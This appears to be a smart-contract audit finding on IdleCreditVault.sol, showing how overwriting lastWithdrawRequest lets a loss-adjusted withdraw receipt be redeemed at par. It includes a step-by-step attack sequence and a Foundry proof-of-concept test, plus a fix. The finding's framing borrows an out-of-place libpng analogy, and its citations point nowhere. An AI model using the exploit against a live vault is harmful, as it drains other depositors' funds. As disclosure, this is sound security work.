### Title
Loss-adjusted withdraw receipt escapes the haircut when the user re-requests in a later epoch, overwriting `lastWithdrawRequest` (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
`IdleCreditVault` applies stop-epoch losses to pending withdraw receipts via `lossRecoveryPriceByEpoch`, keyed by `lastWithdrawRequest[_user]`. That single-slot marker is overwritten on every new `requestWithdraw`, so a loss-epoch receipt becomes unreachable for `_claimLossAdjustedWithdrawRequest` and is later paid **at par** by `_claimFundedWithdrawRequest`, stealing the haircut difference from the strategy's funded reserve.

### Finding Description
The libpng bug class is "freed/stale buffer aliased back into the same object": a marker is invalidated but the stale data it pointed to is still consumed. The analog here:

- On every `requestWithdraw`, the vault stores `lastWithdrawRequest[_user] = currentEpoch` and accumulates `withdrawsRequests[_user] += _amount` plus `withdrawsRequestsByEpoch[_user][currentEpoch] += _amount` [1](#0-0) .
- `_claimLossAdjustedWithdrawRequest` only looks up `lossRecoveryPriceByEpoch[lastWithdrawRequest[_user]]` — i.e., only the *most recent* request epoch can ever be loss-adjusted [2](#0-1) .
- `_claimFundedWithdrawRequest` gates on `epochNumber <= lastWithdrawRequest[_user]` and then pays the *entire* `withdrawsRequests[_user]` balance at par via `_transferFundedClaim`, clearing everything [3](#0-2) .
- `_clearWithdrawClaimForEpoch` only resets `lastWithdrawRequest` when it equals the epoch being cleared; a newer request epoch leaves the stale epoch-N receipt stranded in `withdrawsRequests` [4](#0-3) .

Sequence (fixed-APR mode, running → stopped-with-loss → running):

1. Epoch N: attacker (KYC'd lender) calls `requestWithdraw` → receipt R1 recorded at epoch N, `lastWithdrawRequest = N`.
2. Epoch ends via `stopEpochWithDuration(_lossAmount)` → `lossRecoveryPriceByEpoch[N] = p < RECOVERY_FULL`; the borrower funds only the haircut amount; `pendingWithdraws` is reduced by the *funded* (haircut) amount, but `withdrawsRequests[attacker]` still holds the full claim basis.
3. Epoch N+1 starts; attacker calls `requestWithdraw` again → `lastWithdrawRequest = N+1`, receipt R2 added.
4. `claimWithdrawRequest` during epoch N+1: `_claimLossAdjustedWithdrawRequest` reads `lossRecoveryPriceByEpoch[N+1] == 0` and returns; the funded-claim gate `epochNumber (N+1) <= lastWithdrawRequest (N+1)` correctly reverts — R1 is now orphaned from its haircut price.
5. Epoch N+1 ends (`epochNumber = N+2`). Attacker calls `claimWithdrawRequest` → `_claimFundedWithdrawRequest` pays `withdrawsRequests[attacker] = R1_basis + R2_basis` **entirely at par**, burning the receipt tokens. R1 was only funded at `p * basis`, so `(RECOVERY_FULL - p) * R1_basis / RECOVERY_FULL` is paid out of underlyings belonging to other pending/funded claimants.

### Impact Explanation
Direct theft / insolvency: the attacker redeems a loss-socialized receipt at 100%, draining `RECOVERY_FULL - lossRecoveryPrice` fraction of their first receipt from the strategy's funded withdrawal reserve. Other users' funded claims are left undercollateralized by the same amount (loss waterfall invariant broken: the epoch-N loss is silently shifted onto remaining claimants instead of the withdrawing user).

### Likelihood Explanation
Requires only a tranche-token holder passing `isWalletAllowed`, a loss epoch (`stopEpochWithDuration(_lossAmount)`, an honest-manager action), and a second withdraw request in the next epoch — all unprivileged, no privileged collusion, no reentrancy. Payout is bounded by the attacker's own deposit size, so loss scales linearly with attacker capital; classified Medium severity consistent with the source advisory.

### Recommendation
Track loss-adjusted receipts per epoch instead of a single `lastWithdrawRequest` slot: e.g., iterate `withdrawsRequestsByEpoch` entries whose `lossRecoveryPriceByEpoch[e] != 0`, or store a per-user epoch list/bitmap. At minimum, in `requestWithdraw`, refuse or first settle any existing receipt whose epoch has a nonzero `lossRecoveryPriceByEpoch`, so no stale receipt can outlive its haircut marker.

### Proof of Concept
Foundry fork test (mainnet fork as in `test/foundry/IdleCreditVault.t.sol`), attacker = `user1`:

```solidity
function testLossReceiptEscapesHaircutAfterRerequest() external {
    _setFeeParams(TL_MULTISIG, 0, FULL_ALLOC, cdoEpoch.managementFee());
    address user1 = makeAddr('user1');
    _depositWithUser(user1, 10_000 * ONE_SCALE, true); // KYC'd lender

    // Epoch 0 running: request withdraw
    _startEpochAndCheckPrices(0);
    vm.prank(user1);
    uint256 r1 = cdoEpoch.requestWithdraw(0, address(AAtranche));

    // stopEpochWithDuration applies a loss; borrower funds only haircut amount
    vm.warp(cdoEpoch.epochEndDate() + 1);
    uint256 loss = _expectedFundsEndEpoch() / 4; // 25% loss
    deal(defaultUnderlying, borrower, _expectedFundsEndEpoch() - loss);
    vm.prank(manager);
    cdoEpoch.stopEpochWithDuration(initialProvidedApr, loss, epochDuration);
    // lossRecoveryPriceByEpoch[0] < RECOVERY_FULL

    // Epoch 1 starts; attacker requests again -> lastWithdrawRequest = 1
    _startEpochAndCheckPrices(1);
    vm.prank(user1);
    cdoEpoch.requestWithdraw(0, address(AAtranche));

    // epoch 1 ends normally
    vm.warp(cdoEpoch.epochEndDate() + 1);
    deal(defaultUnderlying, borrower, _expectedFundsEndEpoch());
    vm.prank(manager);
    cdoEpoch.stopEpoch(initialProvidedApr, 0);

    // claim: funded path pays BOTH receipts at par; r1 was only funded at haircut price
    uint256 balPre = underlying.balanceOf(user1);
    vm.prank(user1);
    cdoEpoch.claimWithdrawRequest();
    uint256 paid = underlying.balanceOf(user1) - balPre;

    uint256 haircutR1 = r1 * IdleCreditVault(address(strategy)).lossRecoveryPriceByEpoch(0)
        / IdleCreditVault(address(strategy)).RECOVERY_FULL();
    // Attacker received full r1 instead of haircutR1 -> excess is stolen from reserve
    assertGt(paid, haircutR1, 'loss-adjusted receipt paid at par');
}
```

```text
  function _claimLossAdjustedWithdrawRequest(address _user) internal returns (uint256 amount) {
    uint256 lossEpoch = lastWithdrawRequest[_user];
    uint256 lossRecoveryPrice = lossRecoveryPriceByEpoch[lossEpoch];
    if (lossRecoveryPrice == 0) return amount;

    (uint256 claimBasis, uint256 burnAmount) = _clearWithdrawClaimForEpoch(_user, lossEpoch, false);
    if (claimBasis == 0) return amount;

    // pendingWithdraws was already cleared when the borrower funded the loss-adjusted amount.
    _burn(_user, burnAmount);
    amount = (claimBasis * lossRecoveryPrice) / RECOVERY_FULL;
    _transferFundedClaim(_user, amount);
```
